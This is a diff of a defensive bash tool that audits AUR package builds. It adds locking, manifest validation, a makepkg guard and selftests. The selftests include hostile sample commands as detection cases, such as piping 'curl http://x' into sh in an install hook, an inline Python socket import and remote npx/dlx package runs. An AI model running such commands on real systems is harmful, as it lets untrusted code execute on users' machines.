   [[ -z "$helper" ]] && die "neither yay nor paru found on PATH"
@@ -1641,11 +1977,24 @@ cmd_gate() {
   # `accept` (called by the wrapper after a successful build) promotes only
   # these. Truncate here so a stale manifest from a prior/Ctrl-C'd run can't
   # leak unrelated packages into accept.
-  : >"$MANIFEST_FILE"
+  if ! : >"$MANIFEST_FILE"; then
+    log "$(c_red "BLOCK") cannot initialize gate manifest: $MANIFEST_FILE"
+    exit 1
+  fi
   AUR_SAFE_STAGING=1
 
-  local updates pkgs=()
-  updates=$("$helper" -Qua 2>/dev/null || true)
+  local updates qua_err qua_rc pkgs=()
+  qua_err=$(mktemp -t aur-safe-qua.XXXXXX) \
+    || { log "$(c_red "BLOCK") could not create update-query error log"; exit 1; }
+  _register_temp_path "$qua_err"
+  updates=$("$helper" -Qua 2>"$qua_err"); qua_rc=$?
+  if (( qua_rc != 0 )); then
+    log "$(c_red "BLOCK") AUR update enumeration failed (helper rc $qua_rc); candidate set unknown"
+    sed 's/^/      /' "$qua_err" | head -8 >&2
+    rm -f "$qua_err"
+    exit 1
+  fi
+  rm -f "$qua_err"
   while IFS= read -r line; do
     [[ -z "$line" ]] && continue
     pkgs+=("${line%% *}")
@@ -1673,7 +2022,7 @@ cmd_gate() {
 
   case $rc_overall in
     0)  log "$(c_green "✓ all clear") — proceed with $helper" ;;
-    1)  log "$(c_red "✗ BLOCKED") — hard-fail rule(s) fired. Aborting. Review with: aur-safe explain" ;;
+    1)  log "$(c_red "✗ BLOCKED") — deterministic rule or audit failure. See package notes above; helper not run." ;;
     2)  log "$(c_yellow "⚠ review needed") — no blocking issue found. Read the package note(s) above before choosing below."
         review_prompt "${review_pkgs[@]}"
         exit $? ;;
@@ -1683,6 +2032,7 @@ cmd_gate() {
 
 cmd_check() {
   [[ $# -lt 1 ]] && die "usage: aur-safe check <pkg> [<pkg>...]"
+  _acquire_state_lock || exit 1
   gc_state
   local rc_overall=0 pkg rc
   for pkg in "$@"; do
@@ -1696,7 +2046,7 @@ cmd_check() {
   exit $rc_overall
 }
 
-cmd_accept() {
+_cmd_accept_locked() {
   # Promote staged refs → accepted, but ONLY for packages confirmed installed at
   # the staged version (the install-confirmation assertion). Called by the
   # wrapper after `yay/paru` returns. Safe on ANY exit code: a package that
@@ -1707,25 +2057,49 @@ cmd_accept() {
     log "$(c_dim "accept: no staged refs; nothing to do")"
     return 0
   fi
-  local pkgbase staged_file staged_sha dir promoted=0 skipped=0
+  local pkgbase staged_file staged_sha staged_at dir promoted=0 skipped=0
   while IFS= read -r pkgbase; do
     [[ -z "$pkgbase" ]] && continue
+    if ! _valid_pkg_name "$pkgbase"; then
+      skipped=$((skipped+1))
+      log "$(c_yellow "accept:") invalid pkgbase in manifest; skipping"
+      continue
+    fi
     staged_file="$STAGED_DIR/$pkgbase"
     [[ -f "$staged_file" ]] || { skipped=$((skipped+1)); continue; }
     staged_sha=$(awk -F'\t' '{print $1; exit}' "$staged_file")
+    [[ "$staged_sha" =~ ^[0-9a-f]{40}$ ]] \
+      || { skipped=$((skipped+1)); continue; }
+    staged_at=$(stat -c %Y "$staged_file" 2>/dev/null) \
+      || { skipped=$((skipped+1)); continue; }
     dir=$(find_pkg_dir "$pkgbase") || { skipped=$((skipped+1)); continue; }
-    if _installed_matches "$dir" "$staged_sha"; then
-      mv -f "$staged_file" "$ACCEPTED_DIR/$pkgbase"
-      promoted=$((promoted+1))
+    if _installed_matches "$dir" "$staged_sha" "$pkgbase" "$staged_at"; then
+      if mv -f "$staged_file" "$ACCEPTED_DIR/$pkgbase"; then
+        promoted=$((promoted+1))
+      else
+        skipped=$((skipped+1))
+        log "$(c_yellow "accept:") failed to promote $pkgbase; anchor unchanged"
+      fi
     else
       skipped=$((skipped+1))
       log "$(c_dim "accept: $pkgbase not installed at staged version; anchor unchanged")"
     fi
   done <"$manifest"
   # Rotate the manifest so a stale one can't be re-accepted by a later call.
-  : >"$manifest"
+  if ! : >"$manifest"; then
+    log "$(c_yellow "accept:") could not rotate manifest: $manifest"
+    return 1
+  fi
   log "$(c_dim "accept: $promoted promoted, $skipped skipped")"
   return 0
+}
+
+cmd_accept() {
+  local rc
+  _acquire_state_lock || return 1
+  _cmd_accept_locked; rc=$?
+  _release_state_lock
+  return "$rc"
 }
 
 cmd_explain() {
@@ -1734,12 +2108,14 @@ cmd_explain() {
   local pkg flagfile context context_note
   if [[ $# -ge 1 ]]; then
     pkg="$1"
+    _valid_pkg_name "$pkg" || die "invalid package name: $pkg"
     flagfile="$STATE_DIR/flag.${pkg}.diff"
   else
     pkg=$(cat "$STATE_DIR/last-flag.pkg" 2>/dev/null || true)
     flagfile="$STATE_DIR/last-flag.diff"
   fi
-  [[ -z "$pkg" || ! -r "$flagfile" ]] && die "no flagged diff for '$pkg'. Run 'aur-safe gate' or 'aur-safe check <pkg>' first."
+  _valid_pkg_name "$pkg" || die "invalid package name in flag state: $pkg"
+  [[ ! -r "$flagfile" ]] && die "no flagged diff for '$pkg'. Run 'aur-safe gate' or 'aur-safe check <pkg>' first."
   context=$(cat "$STATE_DIR/flag.${pkg}.context" 2>/dev/null || true)
   case "$context" in
     hard)
@@ -1756,6 +2132,9 @@ cmd_explain() {
       ;;
     whole-file-review)
       context_note="The missing-cache fallback stashed whole-file scan content for human review."
+      ;;
+    baseline-recovery-whole-review)
+      context_note="The missing-cache gate reconstructed an attacker-retained history baseline; this is the whole candidate, required for human review."
       ;;
     *)
       context_note="The deterministic gate stashed this context for review."
@@ -1864,16 +2243,87 @@ cmd_rules() {
   done
 }
 
+_exec_real_makepkg() {
+  [[ -x /usr/bin/makepkg ]] || return 127
+  exec /usr/bin/makepkg "$@"
+}
+
+cmd_makepkg() {
+  # Final pre-execution guard (Finding S). yay/paru invoke this script through
+  # --makepkg; do not source PKGBUILD or mutate trust state here. The wrapper
+  # holds the transaction lock while this child proves the checkout is exactly
+  # the SHA audited and staged for this manifest.
+  [[ "${AUR_SAFE_AS_MAKEPKG:-}" == 1 && "${AUR_SAFE_TRANSACTION_ACTIVE:-}" == 1 ]] \
+    || { log "$(c_red "BLOCK") makepkg guard: no active audited transaction"; return 1; }
+  local top pkgbase staged_file staged_sha head dirty arg
+  for arg in "$@"; do
+    if [[ "$arg" == --repackage || "$arg" == --repackage=* \
+          || "$arg" == --noextract || "$arg" == --noextract=* \
+          || "$arg" == --nobuild || "$arg" == --nobuild=* \
+          || "$arg" == --noarchive || "$arg" == --noarchive=* \
+          || "$arg" == --skipchecksums || "$arg" == --skipchecksums=* \
+          || "$arg" == --skipinteg || "$arg" == --skipinteg=* \
+          || "$arg" == --skippgpcheck || "$arg" == --skippgpcheck=* \
+          || "$arg" == --dir || "$arg" == --dir=* \
+          || "$arg" == --config || "$arg" == --config=* \
+          || "$arg" =~ ^-[^-]*[DReop] ]]; then
+      log "$(c_red "BLOCK") makepkg guard: unsafe build mode/context '$arg'"
+      return 1
+    fi
+  done
+  top=$(git rev-parse --show-toplevel 2>/dev/null) \
+    || { log "$(c_red "BLOCK") makepkg guard: build directory is not a git checkout"; return 1; }
+  pkgbase="${top##*/}"
+  _valid_pkg_name "$pkgbase" \
+    || { log "$(c_red "BLOCK") makepkg guard: invalid pkgbase '$pkgbase'"; return 1; }
+  grep -Fxq -- "$pkgbase" "$MANIFEST_FILE" 2>/dev/null \
+    || { log "$(c_red "BLOCK") makepkg guard: $pkgbase was not audited in this transaction"; return 1; }
+  staged_file="$STAGED_DIR/$pkgbase"
+  [[ -f "$staged_file" ]] \
+    || { log "$(c_red "BLOCK") makepkg guard: no staged ref for $pkgbase"; return 1; }
+  staged_sha=$(awk -F'\t' '{print $1; exit}' "$staged_file")
+  [[ "$staged_sha" =~ ^[0-9a-f]{40}$ ]] \
+    || { log "$(c_red "BLOCK") makepkg guard: malformed staged ref for $pkgbase"; return 1; }
+  head=$(git -C "$top" rev-parse --verify HEAD 2>/dev/null) \
+    || { log "$(c_red "BLOCK") makepkg guard: cannot resolve HEAD for $pkgbase"; return 1; }
+  [[ "$head" == "$staged_sha" ]] \
+    || { log "$(c_red "BLOCK") makepkg guard: $pkgbase checkout changed after audit; rerun yay/paru"; return 1; }
+  if ! git -C "$top" diff --quiet HEAD -- \
+      || ! git -C "$top" diff --cached --quiet HEAD --; then
+    log "$(c_red "BLOCK") makepkg guard: tracked files changed after audit for $pkgbase"
+    return 1
+  fi
+  dirty=$(git -C "$top" ls-files --others --exclude-standard -- \
+    PKGBUILD .SRCINFO '*.install' '*.sh' 2>/dev/null) \
+    || { log "$(c_red "BLOCK") makepkg guard: cannot inspect untracked scripts for $pkgbase"; return 1; }
+  [[ -z "$dirty" ]] \
+    || { log "$(c_red "BLOCK") makepkg guard: untracked build/script files present for $pkgbase"; return 1; }
+  [[ -x /usr/bin/makepkg ]] \
+    || { log "$(c_red "BLOCK") /usr/bin/makepkg is unavailable"; return 1; }
+  unset AUR_SAFE_AS_MAKEPKG AUR_SAFE_TRANSACTION_ACTIVE AUR_SAFE_LOCK_HELD AUR_SAFE_STAGING
+  # Clean source/build state and overwrite any existing package artifact;
+  # otherwise a helper can reuse output that predates checkout validation.
+  _exec_real_makepkg --cleanbuild --force "$@"
+}
+
 cmd_audit() {
   # Advisory scan of a package not yet in the cache (new install candidate).
   # Applies absolute rules to PKGBUILD + .install + .sh (the sourced-script
   # surface). Does not block (exit 0); prints findings for human review.
   [[ $# -lt 1 ]] && die "usage: aur-safe audit <pkg>"
   local pkg="$1"
-  [[ "$pkg" =~ ^[a-z0-9@._+-]+$ ]] || die "invalid package name: $pkg"
+  _valid_pkg_name "$pkg" || die "invalid package name: $pkg"
   log "$(c_bold "findings for $pkg (advisory, non-blocking)")"
   if ! scan_clone "$pkg"; then
     die "could not clone or read $pkg (does it exist on AUR?)"
+  fi
+  if [[ -n "${AUR_SAFE_STAGING:-}" ]]; then
+    _valid_pkg_name "${SCAN_PKGBASE:-}" \
+      || { log "$(c_red "BLOCK") audit could not resolve a safe pkgbase"; return 1; }
+    if ! _stage_scan_if_gating "$SCAN_PKGBASE"; then
+      log "$(c_red "BLOCK") audit could not persist staged state"
+      return 1
+    fi
   fi
   return 0
 }
@@ -1891,63 +2341,157 @@ cmd_wrapper() {
 # non-interactive.
 
 if command -v aur-safe >/dev/null 2>&1; then
-  # Classify an arg list. Emits zero or more `audit <pkg>` lines, then a final
-  # `gate` if the invocation implies an upgrade. Drives _aur_safe_dispatch.
-  # Scans by FLAG SET (not exact first-token match) because yay/paru flags
-  # cluster arbitrarily: -Syu, -Su, -Sua, -Syyu, -Syua all mean upgrade.
+  # Classify an arg list. Emits explicit sync targets plus a final `gate` for
+  # sync+sysupgrade, or bare sysupgrade (helpers default it to sync). Flag
+  # clusters are arbitrary: -Syu/-Su/-Sua gate; query -Qu and refresh-only -Sy
+  # do not.
   _aur_safe_classify() {
-    local _a _mode=pass _expect_pkg=0
-    [ $# -eq 0 ] && { echo gate; return 0; }
+    local _a _sync=0 _upgrade=0 _other_op=0 _expect_pkg=0 _skip_arg=0
+    [ $# -eq 0 ] && { echo AUR_SAFE_GATE; return 0; }
     for _a; do
+      if [ "$_skip_arg" = 1 ]; then
+        _skip_arg=0
+        continue
+      fi
       case "$_a" in
-        --sysupgrade|--refresh) _mode=gate ;;
-        --sync) [ "$_mode" != gate ] && _mode=install; _expect_pkg=1 ;;
+        # Options whose following operand is not a package target. Context-
+        # changing options are rejected by dispatch below; these are safe to
+        # preserve without feeding their values to `aur-safe audit`.
+        --assume-installed|--ignore|--ignoregroup|--overwrite|--ask|\
+        --cachedir|--hookdir|--gpgdir|--logfile|--print-format|--color|\
+        --answerclean|--answerdiff|--answeredit|--answerupgrade|\
+        --builddir|--clonedir|--sortby|--searchby|--editor|--editorflags|\
+        --bat|--batflags|--fm|--fmflags|--requestsplitn|\
+        --completioninterval|--limit|--develsuffixes)
+          _skip_arg=1 ;;
+        --sysupgrade) _upgrade=1 ;;
+        --refresh) ;;
+        --sync) _sync=1; _expect_pkg=1 ;;
+        --query|--remove|--database|--files|--deptest|--upgrade) _other_op=1 ;;
         --) ;;
-        # short flag cluster: u → upgrade (wins), S → sync/install.
-        # gate must not be overwritten by a later S in the same cluster.
+        # Short clusters can combine or split operation flags.
         -[!-]*)
-          case "$_a" in *u*) _mode=gate ;; esac
-          if [ "$_mode" != gate ]; then
-            case "$_a" in *S*) _mode=install; _expect_pkg=1 ;; esac
-          fi
+          case "$_a" in *u*) _upgrade=1 ;; esac
+          case "$_a" in *S*) _sync=1; _expect_pkg=1 ;; esac
+          case "$_a" in *[QRDFTU]*) _other_op=1 ;; esac
           ;;
         -*) ;;
         *)
-          if [ "$_mode" = install ] && [ "$_expect_pkg" = 1 ]; then
-            printf '%s\n' "$_a"
+          if [ "$_expect_pkg" = 1 ]; then
+            case "$_a" in
+              .*|*[!a-z0-9@._+-]*) echo INVALID_TARGET ;;
+              *) printf 'PKG:%s\n' "$_a" ;;
+            esac
           fi
           ;;
       esac
     done
-    [ "$_mode" = gate ] && echo gate
+    if [ "$_upgrade" = 1 ] && { [ "$_sync" = 1 ] || [ "$_other_op" = 0 ]; }; then
+      echo AUR_SAFE_GATE
+    fi
     return 0
   }
 
   _aur_safe_dispatch() {
-    local _helper=$1 _line _gate=0 _out _rc
+    local _helper=$1 _line _gate=0 _out _rc _aur_safe_bin _rebuild_opt
+    local _context_opt1 _context_opt2
     shift
+    case "${_helper##*/}" in
+      yay)
+        _rebuild_opt=--rebuildall
+        _context_opt1=--nomakepkgconf
+        _context_opt2=
+        ;;
+      paru)
+        _rebuild_opt=--rebuild=all
+        _context_opt1=--nochroot
+        _context_opt2=--nolocalrepo
+        ;;
+      *) printf 'aur-safe: unsupported helper path: %s\n' "$_helper" >&2; return 1 ;;
+    esac
+    for _line in "$@"; do
+      case "$_line" in
+        --makepkg|--makepkg=*|--mflags|--mflags=*|\
+        --makepkgconf|--makepkgconf=*|\
+        --rebuild|--rebuild=*|--rebuildall|--rebuildtree|\
+        --norebuild|--norebuild=*|--no-rebuild|--no-rebuild=*|\
+        --chroot|--chroot=*|--nochroot|--no-chroot|\
+        --localrepo|--localrepo=*|--nolocalrepo|--no-localrepo|\
+        --config|--config=*|--root|--root=*|--dbpath|--dbpath=*|\
+        --sysroot|--sysroot=*|--arch|--arch=*|-r|-r*|-b|-b*|-[!-]*[rb]*|\
+        --aururl|--aururl=*|--aurrpcur|--aurrpcur=*|\
+        --aurrpcurl|--aurrpcurl=*|--mode|--mode=*|\
+        --pacman|--pacman=*|--git|--git=*|--gitflags|--gitflags=*|\
+        --gpg|--gpg=*|--gpgflags|--gpgflags=*|\
+        --sudo|--sudo=*|--sudoflags|--sudoflags=*|--pkgctl|--pkgctl=*)
+          printf 'aur-safe: custom helper/build trust context is unsupported; aborting\n' >&2
+          return 1
+          ;;
+      esac
+    done
+    _aur_safe_bin=$(command -v aur-safe) || return 1
     _out=$(_aur_safe_classify "$@")
-    # line-by-line: package names can't be word-split safely in a for-loop
+    # First pass only determines the mode; do not audit outside the transaction
+    # lock or another gate can overwrite its staged state before install.
     while IFS= read -r _line; do
-      [ -z "$_line" ] && continue
-      if [ "$_line" = gate ]; then
-        _gate=1
-      else
-        aur-safe audit "$_line"
-      fi
+      [ "$_line" = AUR_SAFE_GATE ] && _gate=1
     done <<< "$_out"
-    if [ "$_gate" = 1 ]; then
-      _aur_safe_gate || return $?
-      command "$_helper" "$@"
-      _rc=$?
-      # Promote audited refs → accepted. Safe on any rc: install-confirmation
-      # inside `aur-safe accept` skips anything not installed at the staged
-      # version, so a failed or partial build can't poison the trust anchor.
-      aur-safe accept || true
-      return "$_rc"
-    else
-      command "$_helper" "$@"
+    if [ "$_gate" = 1 ] || [ -n "$_out" ]; then
+      local _sd
+      _sd="${AUR_SAFE_STATE_DIR:-$HOME/.cache/aur-safe}"
+      mkdir -p "$_sd" || return 1
+      command -v flock >/dev/null 2>&1 || {
+        printf 'aur-safe: flock is required for state locking\n' >&2
+        return 1
+      }
+      # Hold one lock across audit/gate → helper build/install → accept.
+      (
+        flock 9 || exit 1
+        export AUR_SAFE_LOCK_HELD=1
+        if [ "$_gate" = 1 ]; then
+          _aur_safe_gate || exit $?
+        else
+          : >"$_sd/last-gate" || exit 1
+        fi
+        # A combined `-Syu explicit-target` must audit both the pending update
+        # set and explicit new AUR targets in this same locked manifest.
+        export AUR_SAFE_STAGING=1
+        while IFS= read -r _line; do
+          [ -z "$_line" ] && continue
+          [ "$_line" = AUR_SAFE_GATE ] && continue
+          case "$_line" in
+            PKG:*) _line=${_line#PKG:} ;;
+            *) printf 'aur-safe: invalid classifier record\n' >&2; exit 1 ;;
+          esac
+          # Repository packages are outside the AUR trust path.
+          if pacman -Si -- "$_line" >/dev/null 2>&1; then
+            continue
+          fi
+          aur-safe audit "$_line" || exit $?
+        done <<< "$_out"
+        # Keep the transaction lock in this wrapper process, but do not expose
+        # its capability fd/env to untrusted PKGBUILD code run by the helper.
+        (
+          exec 9>&-
+          unset AUR_SAFE_LOCK_HELD AUR_SAFE_STAGING
+          export AUR_SAFE_AS_MAKEPKG=1 AUR_SAFE_TRANSACTION_ACTIVE=1
+          command "$_helper" --makepkg "$_aur_safe_bin" \
+            --mflags '--cleanbuild --force' "$_rebuild_opt" "$_context_opt1" \
+            ${_context_opt2:+"$_context_opt2"} "$@"
+        )
+        _rc=$?
+        # Promotion failure must be visible even though the helper's exit code
+        # remains the wrapper's public result.
+        aur-safe accept \
+          || printf 'aur-safe: accept failed; trust anchor unchanged\n' >&2
+        exit "$_rc"
+      ) 9>"$_sd/run.lock"
+      return $?
     fi
+    AUR_SAFE_AS_MAKEPKG=1 AUR_SAFE_TRANSACTION_ACTIVE=0 \
+      command "$_helper" --makepkg "$_aur_safe_bin" \
+        --mflags '--cleanbuild --force' "$_rebuild_opt" "$_context_opt1" \
+        ${_context_opt2:+"$_context_opt2"} "$@"
   }
 
   _aur_safe_gate() {
@@ -1955,7 +2499,7 @@ if command -v aur-safe >/dev/null 2>&1; then
     local _rc=$?
     case $_rc in
       0) return 0 ;;
-      2) if [ -n "${AUR_SAFE_ALLOW_REVIEW:-}" ]; then
+      2) if [ "${AUR_SAFE_ALLOW_REVIEW:-}" = 1 ]; then
            return 0
          elif [ -t 0 ]; then
            local _ans _sd _pkg _diff
@@ -2031,6 +2575,12 @@ cmd_selftest() {
   t "yarn-cache-install"    "yarn --cache-folder /tmp/y install"        1
   t "npx"                   "npx evil-pkg"                             1
   t "npx-flagged"           "npx --yes evil-pkg"                       1
+  t "bunx"                  "bunx evil-pkg"                            1
+  t "bunx-flagged"          "bunx --bun evil-pkg"                      1
+  t "pnpm-exec"             "pnpm exec evil-pkg"                       1
+  t "pnpm-dlx"              "pnpm dlx evil-pkg"                        1
+  t "yarn-exec"             "yarn exec evil-pkg"                       1
+  t "yarn-dlx"              "yarn dlx evil-pkg"                        1
   # --- install hooks ---
   t "install-hook-ref"      "install=evil-deps.install"                1
   t "post_install-func"     "post_install() { cd /tmp; }"              1
@@ -2099,6 +2649,13 @@ cmd_selftest() {
   if [ "$LLM_AUTO_BORING" = 0 ]; then
     log "  $(c_green "PASS") invalid-llm-config-fails-closed"; pass=$((pass+1))
   else log "  $(c_red "FAIL") invalid-llm-config-fails-closed"; fail=$((fail+1)); fi
+  if AUR_SAFE_ALLOW_REVIEW=1 review_prompt </dev/null >/dev/null 2>&1; then
+    log "  $(c_green "PASS") allow-review-one-enables"; pass=$((pass+1))
+  else log "  $(c_red "FAIL") allow-review-one-enables"; fail=$((fail+1)); fi
+  AUR_SAFE_ALLOW_REVIEW=0 review_prompt </dev/null >/dev/null 2>&1; local _allow_zero_rc=$?
+  if [ "$_allow_zero_rc" = 2 ]; then
+    log "  $(c_green "PASS") allow-review-zero-disabled"; pass=$((pass+1))
+  else log "  $(c_red "FAIL") allow-review-zero-disabled (got rc $_allow_zero_rc)"; fail=$((fail+1)); fi
   CONFIG_FILE="$_old_cfg"; LLM_AUTO_BORING="$_old_llm_auto"
   if (( _had_llm_env )); then
     AUR_SAFE_LLM_AUTO_BORING="$_old_llm_env"
@@ -2129,6 +2686,7 @@ cmd_selftest() {
   ts "scan-yarn-install"     "post_install() { yarn install; }"        1
   ts "scan-hex-run"          'post_install() { printf "\x6e\x70"; }'   1
   ts "scan-pipe-interp"      "post_install() { curl http://x | sh; }"  1
+  ts "scan-python-inline"    'post_install() { python3 -c "import socket"; }' 1
   ts "scan-clean-hook"       "post_install() { gtk-update-icon-cache; }" 0
   rm -rf "$_scan_tmp"
   unset -f ts
@@ -2143,7 +2701,7 @@ cmd_selftest() {
   tw() { # tw "name" "expected" args...
     local name=$1 expected=$2; shift 2
     local got
-    got=$(_aur_safe_classify "$@" | tr '\n' ',' | sed 's/,$//')
+    got=$(_aur_safe_classify "$@" | sed 's/^PKG://; s/^AUR_SAFE_GATE$/gate/' | tr '\n' ',' | sed 's/,$//')
     if [ "$got" = "$expected" ]; then
       log "  $(c_green "PASS") $name"; pass=$((pass+1))
     else
@@ -2157,15 +2715,58 @@ cmd_selftest() {
   tw "-Syua"             "gate"                 -Syua
   tw "-Su"               "gate"                 -Su
   tw "--sysupgrade"      "gate"                 --sysupgrade
+  tw "-S -u"             "gate"                 -S -u
+  tw "-Syu explicit"     "new-aur,gate"          -Syu new-aur
   tw "-Sua --noconfirm"  "gate"                 -Sua --noconfirm
   tw "-S foo"            "foo"                  -S foo
+  if [ "$(_aur_safe_classify -S gate)" = "PKG:gate" ]; then
+    log "  $(c_green "PASS") wrapper-gate-package-not-sentinel"; pass=$((pass+1))
+  else log "  $(c_red "FAIL") wrapper-gate-package-not-sentinel"; fail=$((fail+1)); fi
   tw "-S foo bar"        "foo,bar"              -S foo bar
   tw "-S foo --needed bar" "foo,bar"            -S foo --needed bar
+  tw "-S assume-installed operand" "foo"         -S --assume-installed fake=1 foo
+  tw "-S color operand"    "foo"                  -S --color always foo
+  tw "-S invalid target"   "INVALID_TARGET"       -S '../foo'
   tw "-Sy"               ""                     -Sy
+  tw "--refresh"         ""                     --refresh
   tw "-Q"                ""                     -Q
+  tw "-Qu"               ""                     -Qu
   tw "-Q cursor-bin"     ""                     -Q cursor-bin
   tw "-Q rustup"         ""                     -Q rustup
   tw "-R foo"            ""                     -R foo
+  local _wrapper_text
+  _wrapper_text=$(cmd_wrapper)
+  if grep -q 'flock 9' <<<"$_wrapper_text" \
+      && grep -q 'export AUR_SAFE_LOCK_HELD=1' <<<"$_wrapper_text" \
+      && grep -q 'exec 9>&-' <<<"$_wrapper_text" \
+      && grep -q 'unset AUR_SAFE_LOCK_HELD AUR_SAFE_STAGING' <<<"$_wrapper_text" \
+      && grep -q 'export AUR_SAFE_AS_MAKEPKG=1 AUR_SAFE_TRANSACTION_ACTIVE=1' <<<"$_wrapper_text" \
+      && grep -q 'AUR_SAFE_TRANSACTION_ACTIVE=0' <<<"$_wrapper_text" \
+      && grep -q '_rebuild_opt=--rebuildall' <<<"$_wrapper_text" \
+      && grep -q '_rebuild_opt=--rebuild=all' <<<"$_wrapper_text" \
+      && grep -q '_context_opt1=--nomakepkgconf' <<<"$_wrapper_text" \
+      && grep -q '_context_opt1=--nochroot' <<<"$_wrapper_text" \
+      && grep -q '_context_opt2=--nolocalrepo' <<<"$_wrapper_text" \
+      && grep -q -- "--mflags '--cleanbuild --force' \"\$_rebuild_opt\"" <<<"$_wrapper_text" \
+      && grep -q -- '--norebuild' <<<"$_wrapper_text" \
+      && grep -Fq -- '-[!-]*[rb]*' <<<"$_wrapper_text"; then
+    log "  $(c_green "PASS") wrapper-locks-gate-through-accept"; pass=$((pass+1))
+  else log "  $(c_red "FAIL") wrapper-locks-gate-through-accept"; fail=$((fail+1)); fi
+
+  # A failed helper update query must be audit-unavailable, never "no updates".
+  local _gate_tmp _gate_out _gate_rc
+  _gate_tmp=$(mktemp -d)
+  mkdir -p "$_gate_tmp/bin" "$_gate_tmp/state/accepted" "$_gate_tmp/state/staged"
+  printf '#!/usr/bin/env bash\nprintf "query exploded\\n" >&2\nexit 42\n' >"$_gate_tmp/bin/yay"
+  chmod +x "$_gate_tmp/bin/yay"
+  _gate_out=$(PATH="$_gate_tmp/bin:$PATH" AUR_SAFE_STATE_DIR="$_gate_tmp/state" \
+    "$0" gate 2>&1); _gate_rc=$?
+  if [ "$_gate_rc" = 1 ] && grep -q 'update enumeration failed' <<<"$_gate_out"; then
+    log "  $(c_green "PASS") gate-query-failure-not-clean"; pass=$((pass+1))
+  else
+    log "  $(c_red "FAIL") gate-query-failure-not-clean (rc=$_gate_rc)"; fail=$((fail+1))
+  fi
+  rm -rf "$_gate_tmp"
 
   # --- RPC pkgbase parser (Finding N) --------------------------------------
   # Pins the awk JSON parser against fixture responses so the external-AUR-API
@@ -2203,16 +2804,40 @@ cmd_selftest() {
   if [ "$_rc" = 1 ]; then
     log "  $(c_green "PASS") rpc-name-mismatch-returns-1"; pass=$((pass+1))
   else log "  $(c_red "FAIL") rpc-name-mismatch-returns-1 (rc=$_rc out=[[$_out]])"; fail=$((fail+1)); fi
+  _rpc_fixture='{"version":5,"type":"multiinfo","resultcount":1,"results":[{"ID":1,"Name":"cursor-bin","PackageBase":"../escape","PackageBaseID":2}]}'
+  _out=$(_resolve_pkgbase cursor-bin); _rc=$?
+  if [ "$_rc" = 1 ]; then
+    log "  $(c_green "PASS") rpc-invalid-pkgbase-returns-1"; pass=$((pass+1))
+  else log "  $(c_red "FAIL") rpc-invalid-pkgbase-returns-1 (rc=$_rc out=[[$_out]])"; fail=$((fail+1)); fi
+
+  # Cached .SRCINFO is attacker-authored: an unrelated cache repo claiming a
+  # split member must not redirect find_pkg_dir away from the RPC-resolved base.
+  local _cache_tmp _old_yay_cache="$YAY_CACHE" _old_paru_cache="$PARU_CACHE"
+  _cache_tmp=$(mktemp -d); YAY_CACHE="$_cache_tmp/yay"; PARU_CACHE="$_cache_tmp/paru"
+  mkdir -p "$YAY_CACHE/evil-base/.git"
+  printf 'pkgbase = evil-base\n\npkgname = target-member\n' >"$YAY_CACHE/evil-base/.SRCINFO"
+  _rpc_fixture='{"version":5,"type":"multiinfo","resultcount":1,"results":[{"ID":1,"Name":"target-member","PackageBase":"true-base","PackageBaseID":2}]}'
+  _out=$(find_pkg_dir target-member); _rc=$?
+  if [ "$_rc" = 1 ] && [ -z "$_out" ]; then
+    log "  $(c_green "PASS") cache-srcinfo-cannot-redirect-split"; pass=$((pass+1))
+  else log "  $(c_red "FAIL") cache-srcinfo-cannot-redirect-split (rc=$_rc out=[[$_out]])"; fail=$((fail+1)); fi
+  mkdir -p "$YAY_CACHE/true-base/.git"
+  printf 'pkgbase = true-base\n\npkgname = target-member\n' >"$YAY_CACHE/true-base/.SRCINFO"
+  _out=$(find_pkg_dir target-member); _rc=$?
+  if [ "$_rc" = 0 ] && [ "$_out" = "$YAY_CACHE/true-base" ]; then
+    log "  $(c_green "PASS") cache-split-uses-rpc-pkgbase"; pass=$((pass+1))
+  else log "  $(c_red "FAIL") cache-split-uses-rpc-pkgbase (rc=$_rc out=[[$_out]])"; fail=$((fail+1)); fi
+  YAY_CACHE="$_old_yay_cache"; PARU_CACHE="$_old_paru_cache"; rm -rf "$_cache_tmp"
   unset _rpc_fixture
 
   # --- accepted-ref / staging / accept (finding 1.2) -----------------------
-  # Exercises the trust-anchor lifecycle with a temp git repo: seeding,
+  # Exercises the trust-anchor lifecycle with a temp git repo: no implicit seed,
   # persistence, install-confirmation (version match incl. epoch), manifest
   # promotion. find_pkg_dir / _pacman_query are overridden in-scope; the
   # overrides die with this selftest process.
   log ""
   log "  $(c_dim "-- accepted-ref state --")"
-  local _tmp _tsha _epsha
+  local _tmp _tsha _epsha _fbsha _spsha _splsha _foreignsha _zeroepsha
   _tmp=$(mktemp -d)
   git -C "$_tmp" init -q
   git -C "$_tmp" remote add origin "file://$_tmp" 2>/dev/null || true
@@ -2236,26 +2861,36 @@ cmd_selftest() {
     else log "  $(c_red "FAIL") $name (expected rc $expected, got $got)"; fail=$((fail+1)); fi
   }
 
-  ta "accepted-seeds-HEAD"      0 accepted_ref "$_tmp" test-acc
-  if [ "$(awk -F'\t' '{print $1}' "$ACCEPTED_DIR/test-acc")" = "$_tsha" ]; then
-    log "  $(c_green "PASS") accepted-persists-sha"; pass=$((pass+1))
-  else log "  $(c_red "FAIL") accepted-persists-sha"; fail=$((fail+1)); fi
+  ta "accepted-missing-does-not-seed-head" 1 accepted_ref "$_tmp" test-acc
+  if [ ! -e "$ACCEPTED_DIR/test-acc" ]; then
+    log "  $(c_green "PASS") accepted-missing-leaves-no-anchor"; pass=$((pass+1))
+  else log "  $(c_red "FAIL") accepted-missing-leaves-no-anchor"; fail=$((fail+1)); fi
+  _atomic_write_record "$ACCEPTED_DIR/test-acc" \
+    "$_tsha"$'\t'"1970-01-01T00:00:00Z"$'\t'"file://$_tmp"
   if [ "$(accepted_ref "$_tmp" test-acc)" = "$_tsha" ]; then
-    log "  $(c_green "PASS") accepted-idempotent"; pass=$((pass+1))
-  else log "  $(c_red "FAIL") accepted-idempotent"; fail=$((fail+1)); fi
+    log "  $(c_green "PASS") accepted-existing-resolves"; pass=$((pass+1))
+  else log "  $(c_red "FAIL") accepted-existing-resolves"; fail=$((fail+1)); fi
 
   # install-confirmation + accept. The _pacman_query seam is NAME-AWARE: it
   # only reports a package as installed when the queried name matches the
   # configured "_AUR_TEST_Q" name. This is essential — a seam that ignores its
   # argument can't catch "parser queried the wrong name" (the exact class of
   # bug that broke split packages, where pkgbase≠pkgname).
-  # shellcheck disable=SC2329  # test seam, called indirectly by _installed_matches
+  local _AUR_TEST_Q=""
+  # shellcheck disable=SC2329  # test seam, called indirectly by baseline recovery
   _pacman_query() {
